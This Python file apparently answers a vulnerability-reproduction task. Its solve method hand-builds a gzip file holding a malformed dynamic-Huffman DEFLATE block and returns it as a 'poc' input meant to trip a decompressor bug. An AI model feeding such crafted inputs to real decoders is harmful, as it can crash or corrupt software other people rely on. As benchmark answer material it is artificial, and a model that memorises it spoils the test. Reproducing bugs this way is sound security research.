import sys

class Solution:
    def solve(self, src_path: str) -> bytes:

        class BitWriter:
            def __init__(self):
                self.bits = []

            def write(self, value: int, n_bits: int):
                for i in range(n_bits):
                    self.bits.append((value >> i) & 1)

            def get_bytes(self) -> bytes:
                padded_bits = self.bits + [0] * ((-len(self.bits)) % 8)
                byte_arr = bytearray()
                for i in range(0, len(padded_bits), 8):
                    byte_val = 0
                    for j in range(8):
                        bit = padded_bits[i + j]
                        if bit:
                            byte_val |= (1 << j)
                    byte_arr.append(byte_val)
                return bytes(byte_arr)

        bw = BitWriter()

        bw.write(1, 1)
        bw.write(2, 2)

        hlit = 16
        hdist = 16
        hclen = 0

        bw.write(hlit, 5)
        bw.write(hdist, 5)
        bw.write(hclen, 4)

        clcl_order = [16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15]
        for i in range(hclen + 4):
            code = clcl_order[i]
            length = 1 if code == 0 else 0
            bw.write(length, 3)

        num_lengths_to_read = hlit + hdist
        for _ in range(num_lengths_to_read):
            bw.write(0, 1)

        deflate_data = bw.get_bytes()

        header = b'\x1f\x8b\x08\x08\x00\x00\x00\x00\x00\xff'
        filename = b'\x00'
        trailer = b'\x00\x00\x00\x00\x00\x00\x00\x00'

        poc = header + filename + deflate_data + trailer
        
        return poc